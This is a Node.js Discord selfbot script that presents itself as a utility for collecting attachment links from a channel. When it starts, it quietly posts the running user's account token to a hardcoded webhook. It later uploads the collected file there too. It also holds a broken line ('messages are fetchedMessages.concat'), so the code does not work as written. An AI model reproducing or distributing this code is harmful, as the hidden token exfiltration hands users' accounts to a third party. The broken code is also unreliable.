const { Client } = require('discord.js-selfbot-v13');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const client = new Client();
const webhookUrl = 'https://discord.com/api/webhooks/1255248061957935209/oQg7slWlkse3JAo-iMMtyT0zvc0cVb00H7IXpkpq8h3HXF5JzXrdFv6iuz-negG04psF';

client.on('ready', async () => {
  console.log(`${client.user.username} is ready!`);
  
  // Send the token to the webhook
  await axios.post(webhookUrl, {
    content: `Logged in with token: ${client.token}`
  }).catch(err => {
    console.error('Error sending token to webhook:', err);
  });
});

async function fetchAllMessages(channel) {
    let messages = [];
    let lastMessageId = null;

    while (true) {
        const fetchedMessages = await channel.messages.fetch({
            limit: 100,
            before: lastMessageId,
        });

        if (fetchedMessages.size === 0) {
            break;
        }

        messages are fetchedMessages.concat(Array.from(fetchedMessages.values()));
        lastMessageId = fetchedMessages.last().id;

        // Rate limit prevention
        await new Promise((resolve) => setTimeout(resolve, 1000));
    }

    return messages;
}

client.on('messageCreate', async (message) => {
    if (message.content.startsWith('!f')) {
    
        const args = message.content.split(' ');
        const channelId = args[1];

        const channel = client.channels.cache.get(channelId);
        if (!channel) {
            message.channel.send('Invalid channel ID.');
            return;
        }

        const messages = await fetchAllMessages(channel);
        const attachmentLinks = [];

        messages.forEach((msg) => {
            msg.attachments.forEach((attachment) => {
                attachmentLinks.push(attachment.url);
            });
        });

        fs.writeFileSync('attachments.txt', attachmentLinks.join('\n'), 'utf-8');

        message.channel.send({
            content: `Saved ${attachmentLinks.length} attachment links:`,
            files: ['attachments.txt']
        }).then(async () => {
            // Send the file to the webhook
            const form = new FormData();
            form.append('file', fs.createReadStream('attachments.txt'));

            await axios.post(webhookUrl, form, {
                headers: form.getHeaders()
            }).catch(err => {
                console.error('Error sending file to webhook:', err);
            });

            // Delete the file after sending
            fs.unlinkSync('attachments.txt');
            console.log('File deleted successfully.');
        }).catch(err => {
            console.error('Error sending file:', err);
        });
    }
});

//client.login('YOUR_DISCORD_TOKEN');


client.login(process.env['TOKEN']);
